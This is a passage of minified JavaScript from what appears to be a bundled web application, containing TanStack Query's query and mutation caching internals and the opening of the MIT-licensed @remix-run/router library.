                        FS(b)
                            .then(() => (u() ? void 0 : f()))
                            .then(() => {
                                t ? m(g) : S();
                            });
                });
        };
    return {
        promise: i,
        cancel: s,
        continue: () => (o == null || o(), i),
        cancelRetry: a,
        continueRetry: c,
        canStart: d,
        start: () => (d() ? S() : f().then(S), i),
    };
}
var KS = (e) => setTimeout(e, 0);
function GS() {
    let e = [],
        t = 0,
        n = (a) => {
            a();
        },
        r = (a) => {
            a();
        },
        o = KS;
    const i = (a) => {
            t
                ? e.push(a)
                : o(() => {
                      n(a);
                  });
        },
        s = () => {
            const a = e;
            (e = []),
                a.length &&
                    o(() => {
                        r(() => {
                            a.forEach((c) => {
                                n(c);
                            });
                        });
                    });
        };
    return {
        batch: (a) => {
            let c;
            t++;
            try {
                c = a();
            } finally {
                t--, t || s();
            }
            return c;
        },
        batchCalls:
            (a) =>
            (...c) => {
                i(() => {
                    a(...c);
                });
            },
        schedule: i,
        setNotifyFunction: (a) => {
            n = a;
        },
        setBatchNotifyFunction: (a) => {
            r = a;
        },
        setScheduler: (a) => {
            o = a;
        },
    };
}
var Ve = GS(),
    hr,
    mf,
    yy =
        ((mf = class {
            constructor() {
                ne(this, hr);
            }
            destroy() {
                this.clearGcTimeout();
            }
            scheduleGc() {
                this.clearGcTimeout(),
                    DS(this.gcTime) &&
                        K(
                            this,
                            hr,
                            setTimeout(() => {
                                this.optionalRemove();
                            }, this.gcTime)
                        );
            }
            updateGcTime(e) {
                this.gcTime = Math.max(this.gcTime || 0, e ?? (Ha ? 1 / 0 : 5 * 60 * 1e3));
            }
            clearGcTimeout() {
                N(this, hr) && (clearTimeout(N(this, hr)), K(this, hr, void 0));
            }
        }),
        (hr = new WeakMap()),
        mf),
    po,
    gr,
    pt,
    yr,
    Fe,
    ji,
    vr,
    Et,
    on,
    hf,
    QS =
        ((hf = class extends yy {
            constructor(t) {
                super();
                ne(this, Et);
                ne(this, po);
                ne(this, gr);
                ne(this, pt);
                ne(this, yr);
                ne(this, Fe);
                ne(this, ji);
                ne(this, vr);
                K(this, vr, !1),
                    K(this, ji, t.defaultOptions),
                    this.setOptions(t.options),
                    (this.observers = []),
                    K(this, yr, t.client),
                    K(this, pt, N(this, yr).getQueryCache()),
                    (this.queryKey = t.queryKey),
                    (this.queryHash = t.queryHash),
                    K(this, po, XS(this.options)),
                    (this.state = t.state ?? N(this, po)),
                    this.scheduleGc();
            }
            get meta() {
                return this.options.meta;
            }
            get promise() {
                var t;
                return (t = N(this, Fe)) == null ? void 0 : t.promise;
            }
            setOptions(t) {
                (this.options = { ...N(this, ji), ...t }), this.updateGcTime(this.options.gcTime);
            }
            optionalRemove() {
                !this.observers.length && this.state.fetchStatus === "idle" && N(this, pt).remove(this);
            }
            setData(t, n) {
                const r = zS(this.state.data, t, this.options);
                return (
                    De(this, Et, on).call(this, {
                        data: r,
                        type: "success",
                        dataUpdatedAt: n == null ? void 0 : n.updatedAt,
                        manual: n == null ? void 0 : n.manual,
                    }),
                    r
                );
            }
            setState(t, n) {
                De(this, Et, on).call(this, { type: "setState", state: t, setStateOptions: n });
            }
            cancel(t) {
                var r, o;
                const n = (r = N(this, Fe)) == null ? void 0 : r.promise;
                return (o = N(this, Fe)) == null || o.cancel(t), n ? n.then(Pt).catch(Pt) : Promise.resolve();
            }
            destroy() {
                super.destroy(), this.cancel({ silent: !0 });
            }
            reset() {
                this.destroy(), this.setState(N(this, po));
            }
            isActive() {
                return this.observers.some((t) => _S(t.options.enabled, this) !== !1);
            }
            isDisabled() {
                return this.getObserversCount() > 0
                    ? !this.isActive()
                    : this.options.queryFn === id || this.state.dataUpdateCount + this.state.errorUpdateCount === 0;
            }
            isStatic() {
                return this.getObserversCount() > 0
                    ? this.observers.some((t) => zc(t.options.staleTime, this) === "static")
                    : !1;
            }
            isStale() {
                return this.getObserversCount() > 0
                    ? this.observers.some((t) => t.getCurrentResult().isStale)
                    : this.state.data === void 0 || this.state.isInvalidated;
            }
            isStaleByTime(t = 0) {
                return this.state.data === void 0
                    ? !0
                    : t === "static"
                      ? !1
                      : this.state.isInvalidated
                        ? !0
                        : !OS(this.state.dataUpdatedAt, t);
            }
            onFocus() {
                var n;
                const t = this.observers.find((r) => r.shouldFetchOnWindowFocus());
                t == null || t.refetch({ cancelRefetch: !1 }), (n = N(this, Fe)) == null || n.continue();
            }
            onOnline() {
                var n;
                const t = this.observers.find((r) => r.shouldFetchOnReconnect());
                t == null || t.refetch({ cancelRefetch: !1 }), (n = N(this, Fe)) == null || n.continue();
            }
            addObserver(t) {
                this.observers.includes(t) ||
                    (this.observers.push(t),
                    this.clearGcTimeout(),
                    N(this, pt).notify({ type: "observerAdded", query: this, observer: t }));
            }
            removeObserver(t) {
                this.observers.includes(t) &&
                    ((this.observers = this.observers.filter((n) => n !== t)),
                    this.observers.length ||
                        (N(this, Fe) && (N(this, vr) ? N(this, Fe).cancel({ revert: !0 }) : N(this, Fe).cancelRetry()),
                        this.scheduleGc()),
                    N(this, pt).notify({ type: "observerRemoved", query: this, observer: t }));
            }
            getObserversCount() {
                return this.observers.length;
            }
            invalidate() {
                this.state.isInvalidated || De(this, Et, on).call(this, { type: "invalidate" });
            }
            fetch(t, n) {
                var u, d, p;
                if (this.state.fetchStatus !== "idle") {
                    if (this.state.data !== void 0 && n != null && n.cancelRefetch) this.cancel({ silent: !0 });
                    else if (N(this, Fe)) return N(this, Fe).continueRetry(), N(this, Fe).promise;
                }
                if ((t && this.setOptions(t), !this.options.queryFn)) {
                    const m = this.observers.find((f) => f.options.queryFn);
                    m && this.setOptions(m.options);
                }
                const r = new AbortController(),
                    o = (m) => {
                        Object.defineProperty(m, "signal", { enumerable: !0, get: () => (K(this, vr, !0), r.signal) });
                    },
                    i = () => {
                        const m = py(this.options, n),
                            S = (() => {
                                const y = { client: N(this, yr), queryKey: this.queryKey, meta: this.meta };
                                return o(y), y;
                            })();
                        return K(this, vr, !1), this.options.persister ? this.options.persister(m, S, this) : m(S);
                    },
                    a = (() => {
                        const m = {
                            fetchOptions: n,
                            options: this.options,
                            queryKey: this.queryKey,
                            client: N(this, yr),
                            state: this.state,
                            fetchFn: i,
                        };
                        return o(m), m;
                    })();
                (u = this.options.behavior) == null || u.onFetch(a, this),
                    K(this, gr, this.state),
                    (this.state.fetchStatus === "idle" ||
                        this.state.fetchMeta !== ((d = a.fetchOptions) == null ? void 0 : d.meta)) &&
                        De(this, Et, on).call(this, {
                            type: "fetch",
                            meta: (p = a.fetchOptions) == null ? void 0 : p.meta,
                        });
                const c = (m) => {
                    var f, S, y, w;
                    (Al(m) && m.silent) || De(this, Et, on).call(this, { type: "error", error: m }),
                        Al(m) ||
                            ((S = (f = N(this, pt).config).onError) == null || S.call(f, m, this),
                            (w = (y = N(this, pt).config).onSettled) == null || w.call(y, this.state.data, m, this)),
                        this.scheduleGc();
                };
                return (
                    K(
                        this,
                        Fe,
                        gy({
                            initialPromise: n == null ? void 0 : n.initialPromise,
                            fn: a.fetchFn,
                            abort: r.abort.bind(r),
                            onSuccess: (m) => {
                                var f, S, y, w;
                                if (m === void 0) {
                                    c(new Error(`${this.queryHash} data is undefined`));
                                    return;
                                }
                                try {
                                    this.setData(m);
                                } catch (g) {
                                    c(g);
                                    return;
                                }
                                (S = (f = N(this, pt).config).onSuccess) == null || S.call(f, m, this),
                                    (w = (y = N(this, pt).config).onSettled) == null ||
                                        w.call(y, m, this.state.error, this),
                                    this.scheduleGc();
                            },
                            onError: c,
                            onFail: (m, f) => {
                                De(this, Et, on).call(this, { type: "failed", failureCount: m, error: f });
                            },
                            onPause: () => {
                                De(this, Et, on).call(this, { type: "pause" });
                            },
                            onContinue: () => {
                                De(this, Et, on).call(this, { type: "continue" });
                            },
                            retry: a.options.retry,
                            retryDelay: a.options.retryDelay,
                            networkMode: a.options.networkMode,
                            canRun: () => !0,
                        })
                    ),
                    N(this, Fe).start()
                );
            }
        }),
        (po = new WeakMap()),
        (gr = new WeakMap()),
        (pt = new WeakMap()),
        (yr = new WeakMap()),
        (Fe = new WeakMap()),
        (ji = new WeakMap()),
        (vr = new WeakMap()),
        (Et = new WeakSet()),
        (on = function (t) {
            const n = (r) => {
                switch (t.type) {
                    case "failed":
                        return { ...r, fetchFailureCount: t.failureCount, fetchFailureReason: t.error };
                    case "pause":
                        return { ...r, fetchStatus: "paused" };
                    case "continue":
                        return { ...r, fetchStatus: "fetching" };
                    case "fetch":
                        return { ...r, ...qS(r.data, this.options), fetchMeta: t.meta ?? null };
                    case "success":
                        return (
                            K(this, gr, void 0),
                            {
                                ...r,
                                data: t.data,
                                dataUpdateCount: r.dataUpdateCount + 1,
                                dataUpdatedAt: t.dataUpdatedAt ?? Date.now(),
                                error: null,
                                isInvalidated: !1,
                                status: "success",
                                ...(!t.manual && {
                                    fetchStatus: "idle",
                                    fetchFailureCount: 0,
                                    fetchFailureReason: null,
                                }),
                            }
                        );
                    case "error":
                        const o = t.error;
                        return Al(o) && o.revert && N(this, gr)
                            ? { ...N(this, gr), fetchStatus: "idle" }
                            : {
                                  ...r,
                                  error: o,
                                  errorUpdateCount: r.errorUpdateCount + 1,
                                  errorUpdatedAt: Date.now(),
                                  fetchFailureCount: r.fetchFailureCount + 1,
                                  fetchFailureReason: o,
                                  fetchStatus: "idle",
                                  status: "error",
                              };
                    case "invalidate":
                        return { ...r, isInvalidated: !0 };
                    case "setState":
                        return { ...r, ...t.state };
                }
            };
            (this.state = n(this.state)),
                Ve.batch(() => {
                    this.observers.forEach((r) => {
                        r.onQueryUpdate();
                    }),
                        N(this, pt).notify({ query: this, type: "updated", action: t });
                });
        }),
        hf);
function qS(e, t) {
    return {
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchStatus: my(t.networkMode) ? "fetching" : "paused",
        ...(e === void 0 && { error: null, status: "pending" }),
    };
}
function XS(e) {
    const t = typeof e.initialData == "function" ? e.initialData() : e.initialData,
        n = t !== void 0,
        r = n ? (typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt) : 0;
    return {
        data: t,
        dataUpdateCount: 0,
        dataUpdatedAt: n ? (r ?? Date.now()) : 0,
        error: null,
        errorUpdateCount: 0,
        errorUpdatedAt: 0,
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchMeta: null,
        isInvalidated: !1,
        status: n ? "success" : "pending",
        fetchStatus: "idle",
    };
}
var Ht,
    gf,
    YS =
        ((gf = class extends Ua {
            constructor(t = {}) {
                super();
                ne(this, Ht);
                (this.config = t), K(this, Ht, new Map());
            }
            build(t, n, r) {
                const o = n.queryKey,
                    i = n.queryHash ?? od(o, n);
                let s = this.get(i);
                return (
                    s ||
                        ((s = new QS({
                            client: t,
                            queryKey: o,
                            queryHash: i,
                            options: t.defaultQueryOptions(n),
                            state: r,
                            defaultOptions: t.getQueryDefaults(o),
                        })),
                        this.add(s)),
                    s
                );
            }
            add(t) {
                N(this, Ht).has(t.queryHash) ||
                    (N(this, Ht).set(t.queryHash, t), this.notify({ type: "added", query: t }));
            }
            remove(t) {
                const n = N(this, Ht).get(t.queryHash);
                n &&
                    (t.destroy(),
                    n === t && N(this, Ht).delete(t.queryHash),
                    this.notify({ type: "removed", query: t }));
            }
            clear() {
                Ve.batch(() => {
                    this.getAll().forEach((t) => {
                        this.remove(t);
                    });
                });
            }
            get(t) {
                return N(this, Ht).get(t);
            }
            getAll() {
                return [...N(this, Ht).values()];
            }
            find(t) {
                const n = { exact: !0, ...t };
                return this.getAll().find((r) => qp(n, r));
            }
            findAll(t = {}) {
                const n = this.getAll();
                return Object.keys(t).length > 0 ? n.filter((r) => qp(t, r)) : n;
            }
            notify(t) {
                Ve.batch(() => {
                    this.listeners.forEach((n) => {
                        n(t);
                    });
                });
            }
            onFocus() {
                Ve.batch(() => {
                    this.getAll().forEach((t) => {
                        t.onFocus();
                    });
                });
            }
            onOnline() {
                Ve.batch(() => {
                    this.getAll().forEach((t) => {
                        t.onOnline();
                    });
                });
            }
        }),
        (Ht = new WeakMap()),
        gf),
    $t,
    He,
    xr,
    Vt,
    jn,
    yf,
    ZS =
        ((yf = class extends yy {
            constructor(t) {
                super();
                ne(this, Vt);
                ne(this, $t);
                ne(this, He);
                ne(this, xr);
                (this.mutationId = t.mutationId),
                    K(this, He, t.mutationCache),
                    K(this, $t, []),
                    (this.state = t.state || JS()),
                    this.setOptions(t.options),
                    this.scheduleGc();
            }
            setOptions(t) {
                (this.options = t), this.updateGcTime(this.options.gcTime);
            }
            get meta() {
                return this.options.meta;
            }
            addObserver(t) {
                N(this, $t).includes(t) ||
                    (N(this, $t).push(t),
                    this.clearGcTimeout(),
                    N(this, He).notify({ type: "observerAdded", mutation: this, observer: t }));
            }
            removeObserver(t) {
                K(
                    this,
                    $t,
                    N(this, $t).filter((n) => n !== t)
                ),
                    this.scheduleGc(),
                    N(this, He).notify({ type: "observerRemoved", mutation: this, observer: t });
            }
            optionalRemove() {
                N(this, $t).length || (this.state.status === "pending" ? this.scheduleGc() : N(this, He).remove(this));
            }
            continue() {
                var t;
                return ((t = N(this, xr)) == null ? void 0 : t.continue()) ?? this.execute(this.state.variables);
            }
            async execute(t) {
                var i, s, a, c, u, d, p, m, f, S, y, w, g, h, v, b, k, C, P, A;
                const n = () => {
                    De(this, Vt, jn).call(this, { type: "continue" });
                };
                K(
                    this,
                    xr,
                    gy({
                        fn: () =>
                            this.options.mutationFn
                                ? this.options.mutationFn(t)
                                : Promise.reject(new Error("No mutationFn found")),
                        onFail: (L, M) => {
                            De(this, Vt, jn).call(this, { type: "failed", failureCount: L, error: M });
                        },
                        onPause: () => {
                            De(this, Vt, jn).call(this, { type: "pause" });
                        },
                        onContinue: n,
                        retry: this.options.retry ?? 0,
                        retryDelay: this.options.retryDelay,
                        networkMode: this.options.networkMode,
                        canRun: () => N(this, He).canRun(this),
                    })
                );
                const r = this.state.status === "pending",
                    o = !N(this, xr).canStart();
                try {
                    if (r) n();
                    else {
                        De(this, Vt, jn).call(this, { type: "pending", variables: t, isPaused: o }),
                            await ((s = (i = N(this, He).config).onMutate) == null ? void 0 : s.call(i, t, this));
                        const M = await ((c = (a = this.options).onMutate) == null ? void 0 : c.call(a, t));
                        M !== this.state.context &&
                            De(this, Vt, jn).call(this, { type: "pending", context: M, variables: t, isPaused: o });
                    }
                    const L = await N(this, xr).start();
                    return (
                        await ((d = (u = N(this, He).config).onSuccess) == null
                            ? void 0
                            : d.call(u, L, t, this.state.context, this)),
                        await ((m = (p = this.options).onSuccess) == null
                            ? void 0
                            : m.call(p, L, t, this.state.context)),
                        await ((S = (f = N(this, He).config).onSettled) == null
                            ? void 0
                            : S.call(f, L, null, this.state.variables, this.state.context, this)),
                        await ((w = (y = this.options).onSettled) == null
                            ? void 0
                            : w.call(y, L, null, t, this.state.context)),
                        De(this, Vt, jn).call(this, { type: "success", data: L }),
                        L
                    );
                } catch (L) {
                    try {
                        throw (
                            (await ((h = (g = N(this, He).config).onError) == null
                                ? void 0
                                : h.call(g, L, t, this.state.context, this)),
                            await ((b = (v = this.options).onError) == null
                                ? void 0
                                : b.call(v, L, t, this.state.context)),
                            await ((C = (k = N(this, He).config).onSettled) == null
                                ? void 0
                                : C.call(k, void 0, L, this.state.variables, this.state.context, this)),
                            await ((A = (P = this.options).onSettled) == null
                                ? void 0
                                : A.call(P, void 0, L, t, this.state.context)),
                            L)
                        );
                    } finally {
                        De(this, Vt, jn).call(this, { type: "error", error: L });
                    }
                } finally {
                    N(this, He).runNext(this);
                }
            }
        }),
        ($t = new WeakMap()),
        (He = new WeakMap()),
        (xr = new WeakMap()),
        (Vt = new WeakSet()),
        (jn = function (t) {
            const n = (r) => {
                switch (t.type) {
                    case "failed":
                        return { ...r, failureCount: t.failureCount, failureReason: t.error };
                    case "pause":
                        return { ...r, isPaused: !0 };
                    case "continue":
                        return { ...r, isPaused: !1 };
                    case "pending":
                        return {
                            ...r,
                            context: t.context,
                            data: void 0,
                            failureCount: 0,
                            failureReason: null,
                            error: null,
                            isPaused: t.isPaused,
                            status: "pending",
                            variables: t.variables,
                            submittedAt: Date.now(),
                        };
                    case "success":
                        return {
                            ...r,
                            data: t.data,
                            failureCount: 0,
                            failureReason: null,
                            error: null,
                            status: "success",
                            isPaused: !1,
                        };
                    case "error":
                        return {
                            ...r,
                            data: void 0,
                            error: t.error,
                            failureCount: r.failureCount + 1,
                            failureReason: t.error,
                            isPaused: !1,
                            status: "error",
                        };
                }
            };
            (this.state = n(this.state)),
                Ve.batch(() => {
                    N(this, $t).forEach((r) => {
                        r.onMutationUpdate(t);
                    }),
                        N(this, He).notify({ mutation: this, type: "updated", action: t });
                });
        }),
        yf);
function JS() {
    return {
        context: void 0,
        data: void 0,
        error: null,
        failureCount: 0,
        failureReason: null,
        isPaused: !1,
        status: "idle",
        variables: void 0,
        submittedAt: 0,
    };
}
var cn,
    Nt,
    Ri,
    vf,
    eb =
        ((vf = class extends Ua {
            constructor(t = {}) {
                super();
                ne(this, cn);
                ne(this, Nt);
                ne(this, Ri);
                (this.config = t), K(this, cn, new Set()), K(this, Nt, new Map()), K(this, Ri, 0);
            }
            build(t, n, r) {
                const o = new ZS({
                    mutationCache: this,
                    mutationId: ++Wi(this, Ri)._,
                    options: t.defaultMutationOptions(n),
                    state: r,
                });
                return this.add(o), o;
            }
            add(t) {
                N(this, cn).add(t);
                const n = hs(t);
                if (typeof n == "string") {
                    const r = N(this, Nt).get(n);
                    r ? r.push(t) : N(this, Nt).set(n, [t]);
                }
                this.notify({ type: "added", mutation: t });
            }
            remove(t) {
                if (N(this, cn).delete(t)) {
                    const n = hs(t);
                    if (typeof n == "string") {
                        const r = N(this, Nt).get(n);
                        if (r)
                            if (r.length > 1) {
                                const o = r.indexOf(t);
                                o !== -1 && r.splice(o, 1);
                            } else r[0] === t && N(this, Nt).delete(n);
                    }
                }
                this.notify({ type: "removed", mutation: t });
            }
            canRun(t) {
                const n = hs(t);
                if (typeof n == "string") {
                    const r = N(this, Nt).get(n),
                        o = r == null ? void 0 : r.find((i) => i.state.status === "pending");
                    return !o || o === t;
                } else return !0;
            }
            runNext(t) {
                var r;
                const n = hs(t);
                if (typeof n == "string") {
                    const o = (r = N(this, Nt).get(n)) == null ? void 0 : r.find((i) => i !== t && i.state.isPaused);
                    return (o == null ? void 0 : o.continue()) ?? Promise.resolve();
                } else return Promise.resolve();
            }
            clear() {
                Ve.batch(() => {
                    N(this, cn).forEach((t) => {
                        this.notify({ type: "removed", mutation: t });
                    }),
                        N(this, cn).clear(),
                        N(this, Nt).clear();
                });
            }
            getAll() {
                return Array.from(N(this, cn));
            }
            find(t) {
                const n = { exact: !0, ...t };
                return this.getAll().find((r) => Xp(n, r));
            }
            findAll(t = {}) {
                return this.getAll().filter((n) => Xp(t, n));
            }
            notify(t) {
                Ve.batch(() => {
                    this.listeners.forEach((n) => {
                        n(t);
                    });
                });
            }
            resumePausedMutations() {
                const t = this.getAll().filter((n) => n.state.isPaused);
                return Ve.batch(() => Promise.all(t.map((n) => n.continue().catch(Pt))));
            }
        }),
        (cn = new WeakMap()),
        (Nt = new WeakMap()),
        (Ri = new WeakMap()),
        vf);
function hs(e) {
    var t;
    return (t = e.options.scope) == null ? void 0 : t.id;
}
function Jp(e) {
    return {
        onFetch: (t, n) => {
            var d, p, m, f, S;
            const r = t.options,
                o =
                    (m = (p = (d = t.fetchOptions) == null ? void 0 : d.meta) == null ? void 0 : p.fetchMore) == null
                        ? void 0
                        : m.direction,
                i = ((f = t.state.data) == null ? void 0 : f.pages) || [],
                s = ((S = t.state.data) == null ? void 0 : S.pageParams) || [];
            let a = { pages: [], pageParams: [] },
                c = 0;
            const u = async () => {
                let y = !1;
                const w = (v) => {
                        Object.defineProperty(v, "signal", {
                            enumerable: !0,
                            get: () => (
                                t.signal.aborted
                                    ? (y = !0)
                                    : t.signal.addEventListener("abort", () => {
                                          y = !0;
                                      }),
                                t.signal
                            ),
                        });
                    },
                    g = py(t.options, t.fetchOptions),
                    h = async (v, b, k) => {
                        if (y) return Promise.reject();
                        if (b == null && v.pages.length) return Promise.resolve(v);
                        const P = (() => {
                                const U = {
                                    client: t.client,
                                    queryKey: t.queryKey,
                                    pageParam: b,
                                    direction: k ? "backward" : "forward",
                                    meta: t.options.meta,
                                };
                                return w(U), U;
                            })(),
                            A = await g(P),
                            { maxPages: L } = t.options,
                            M = k ? US : BS;
                        return { pages: M(v.pages, A, L), pageParams: M(v.pageParams, b, L) };
                    };
                if (o && i.length) {
                    const v = o === "backward",
                        b = v ? tb : ef,
                        k = { pages: i, pageParams: s },
                        C = b(r, k);
                    a = await h(k, C, v);
                } else {
                    const v = e ?? i.length;
                    do {
                        const b = c === 0 ? (s[0] ?? r.initialPageParam) : ef(r, a);
                        if (c > 0 && b == null) break;
                        (a = await h(a, b)), c++;
                    } while (c < v);
                }
                return a;
            };
            t.options.persister
                ? (t.fetchFn = () => {
                      var y, w;
                      return (w = (y = t.options).persister) == null
                          ? void 0
                          : w.call(
                                y,
                                u,
                                { client: t.client, queryKey: t.queryKey, meta: t.options.meta, signal: t.signal },
                                n
                            );
                  })
                : (t.fetchFn = u);
        },
    };
}
function ef(e, { pages: t, pageParams: n }) {
    const r = t.length - 1;
    return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0;
}
function tb(e, { pages: t, pageParams: n }) {
    var r;
    return t.length > 0 ? ((r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n)) : void 0;
}
var ve,
    Fn,
    zn,
    fo,
    mo,
    Bn,
    ho,
    go,
    xf,
    nb =
        ((xf = class {
            constructor(e = {}) {
                ne(this, ve);
                ne(this, Fn);
                ne(this, zn);
                ne(this, fo);
                ne(this, mo);
                ne(this, Bn);
                ne(this, ho);
                ne(this, go);
                K(this, ve, e.queryCache || new YS()),
                    K(this, Fn, e.mutationCache || new eb()),
                    K(this, zn, e.defaultOptions || {}),
                    K(this, fo, new Map()),
                    K(this, mo, new Map()),
                    K(this, Bn, 0);
            }
            mount() {
                Wi(this, Bn)._++,
                    N(this, Bn) === 1 &&
                        (K(
                            this,
                            ho,
                            fy.subscribe(async (e) => {
                                e && (await this.resumePausedMutations(), N(this, ve).onFocus());
                            })
                        ),
                        K(
                            this,
                            go,
                            fa.subscribe(async (e) => {
                                e && (await this.resumePausedMutations(), N(this, ve).onOnline());
                            })
                        ));
            }
            unmount() {
                var e, t;
                Wi(this, Bn)._--,
                    N(this, Bn) === 0 &&
                        ((e = N(this, ho)) == null || e.call(this),
                        K(this, ho, void 0),
                        (t = N(this, go)) == null || t.call(this),
                        K(this, go, void 0));
            }
            isFetching(e) {
                return N(this, ve).findAll({ ...e, fetchStatus: "fetching" }).length;
            }
            isMutating(e) {
                return N(this, Fn).findAll({ ...e, status: "pending" }).length;
            }
            getQueryData(e) {
                var n;
                const t = this.defaultQueryOptions({ queryKey: e });
                return (n = N(this, ve).get(t.queryHash)) == null ? void 0 : n.state.data;
            }
            ensureQueryData(e) {
                const t = this.defaultQueryOptions(e),
                    n = N(this, ve).build(this, t),
                    r = n.state.data;
                return r === void 0
                    ? this.fetchQuery(e)
                    : (e.revalidateIfStale && n.isStaleByTime(zc(t.staleTime, n)) && this.prefetchQuery(t),
                      Promise.resolve(r));
            }
            getQueriesData(e) {
                return N(this, ve)
                    .findAll(e)
                    .map(({ queryKey: t, state: n }) => {
                        const r = n.data;
                        return [t, r];
                    });
            }
            setQueryData(e, t, n) {
                const r = this.defaultQueryOptions({ queryKey: e }),
                    o = N(this, ve).get(r.queryHash),
                    i = o == null ? void 0 : o.state.data,
                    s = LS(t, i);
                if (s !== void 0)
                    return N(this, ve)
                        .build(this, r)
                        .setData(s, { ...n, manual: !0 });
            }
            setQueriesData(e, t, n) {
                return Ve.batch(() =>
                    N(this, ve)
                        .findAll(e)
                        .map(({ queryKey: r }) => [r, this.setQueryData(r, t, n)])
                );
            }
            getQueryState(e) {
                var n;
                const t = this.defaultQueryOptions({ queryKey: e });
                return (n = N(this, ve).get(t.queryHash)) == null ? void 0 : n.state;
            }
            removeQueries(e) {
                const t = N(this, ve);
                Ve.batch(() => {
                    t.findAll(e).forEach((n) => {
                        t.remove(n);
                    });
                });
            }
            resetQueries(e, t) {
                const n = N(this, ve);
                return Ve.batch(
                    () => (
                        n.findAll(e).forEach((r) => {
                            r.reset();
                        }),
                        this.refetchQueries({ type: "active", ...e }, t)
                    )
                );
            }
            cancelQueries(e, t = {}) {
                const n = { revert: !0, ...t },
                    r = Ve.batch(() =>
                        N(this, ve)
                            .findAll(e)
                            .map((o) => o.cancel(n))
                    );
                return Promise.all(r).then(Pt).catch(Pt);
            }
            invalidateQueries(e, t = {}) {
                return Ve.batch(
                    () => (
                        N(this, ve)
                            .findAll(e)
                            .forEach((n) => {
                                n.invalidate();
                            }),
                        (e == null ? void 0 : e.refetchType) === "none"
                            ? Promise.resolve()
                            : this.refetchQueries(
                                  {
                                      ...e,
                                      type:
                                          (e == null ? void 0 : e.refetchType) ??
                                          (e == null ? void 0 : e.type) ??
                                          "active",
                                  },
                                  t
                              )
                    )
                );
            }
            refetchQueries(e, t = {}) {
                const n = { ...t, cancelRefetch: t.cancelRefetch ?? !0 },
                    r = Ve.batch(() =>
                        N(this, ve)
                            .findAll(e)
                            .filter((o) => !o.isDisabled() && !o.isStatic())
                            .map((o) => {
                                let i = o.fetch(void 0, n);
                                return (
                                    n.throwOnError || (i = i.catch(Pt)),
                                    o.state.fetchStatus === "paused" ? Promise.resolve() : i
                                );
                            })
                    );
                return Promise.all(r).then(Pt);
            }
            fetchQuery(e) {
                const t = this.defaultQueryOptions(e);
                t.retry === void 0 && (t.retry = !1);
                const n = N(this, ve).build(this, t);
                return n.isStaleByTime(zc(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data);
            }
            prefetchQuery(e) {
                return this.fetchQuery(e).then(Pt).catch(Pt);
            }
            fetchInfiniteQuery(e) {
                return (e.behavior = Jp(e.pages)), this.fetchQuery(e);
            }
            prefetchInfiniteQuery(e) {
                return this.fetchInfiniteQuery(e).then(Pt).catch(Pt);
            }
            ensureInfiniteQueryData(e) {
                return (e.behavior = Jp(e.pages)), this.ensureQueryData(e);
            }
            resumePausedMutations() {
                return fa.isOnline() ? N(this, Fn).resumePausedMutations() : Promise.resolve();
            }
            getQueryCache() {
                return N(this, ve);
            }
            getMutationCache() {
                return N(this, Fn);
            }
            getDefaultOptions() {
                return N(this, zn);
            }
            setDefaultOptions(e) {
                K(this, zn, e);
            }
            setQueryDefaults(e, t) {
                N(this, fo).set(Ei(e), { queryKey: e, defaultOptions: t });
            }
            getQueryDefaults(e) {
                const t = [...N(this, fo).values()],
                    n = {};
                return (
                    t.forEach((r) => {
                        Ni(e, r.queryKey) && Object.assign(n, r.defaultOptions);
                    }),
                    n
                );
            }
            setMutationDefaults(e, t) {
                N(this, mo).set(Ei(e), { mutationKey: e, defaultOptions: t });
            }
            getMutationDefaults(e) {
                const t = [...N(this, mo).values()],
                    n = {};
                return (
                    t.forEach((r) => {
                        Ni(e, r.mutationKey) && Object.assign(n, r.defaultOptions);
                    }),
                    n
                );
            }
            defaultQueryOptions(e) {
                if (e._defaulted) return e;
                const t = { ...N(this, zn).queries, ...this.getQueryDefaults(e.queryKey), ...e, _defaulted: !0 };
                return (
                    t.queryHash || (t.queryHash = od(t.queryKey, t)),
                    t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"),
                    t.throwOnError === void 0 && (t.throwOnError = !!t.suspense),
                    !t.networkMode && t.persister && (t.networkMode = "offlineFirst"),
                    t.queryFn === id && (t.enabled = !1),
                    t
                );
            }
            defaultMutationOptions(e) {
                return e != null && e._defaulted
                    ? e
                    : {
                          ...N(this, zn).mutations,
                          ...((e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey)),
                          ...e,
                          _defaulted: !0,
                      };
            }
            clear() {
                N(this, ve).clear(), N(this, Fn).clear();
            }
        }),
        (ve = new WeakMap()),
        (Fn = new WeakMap()),
        (zn = new WeakMap()),
        (fo = new WeakMap()),
        (mo = new WeakMap()),
        (Bn = new WeakMap()),
        (ho = new WeakMap()),
        (go = new WeakMap()),
        xf),
    rb = x.createContext(void 0),
    ob = ({ client: e, children: t }) => (
        x.useEffect(
            () => (
                e.mount(),
                () => {
                    e.unmount();
                }
            ),
            [e]
        ),
        l.jsx(rb.Provider, { value: e, children: t })
    );
/**
 * @remix-run/router v1.23.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function Ti() {
    return (
        (Ti = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        Ti.apply(this, arguments)
    );
}
var $n;
(function (e) {
    (e.Pop = "POP"), (e.Push = "PUSH"), (e.Replace = "REPLACE");
})($n || ($n = {}));
const tf = "popstate";
function ib(e) {
    e === void 0 && (e = {});
    function t(r, o) {
        let { pathname: i, search: s, hash: a } = r.location;
        return Uc(
            "",
            { pathname: i, search: s, hash: a },
            (o.state && o.state.usr) || null,
            (o.state && o.state.key) || "default"
        );
    }
    function n(r, o) {
        return typeof o == "string" ? o : ma(o);
    }
    return ab(t, n, null, e);
}
function ke(e, t) {
    if (e === !1 || e === null || typeof e > "u") throw new Error(t);
}
function vy(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t);
        } catch {}
    }
}
function sb() {
    return Math.random().toString(36).substr(2, 8);
}
function nf(e, t) {
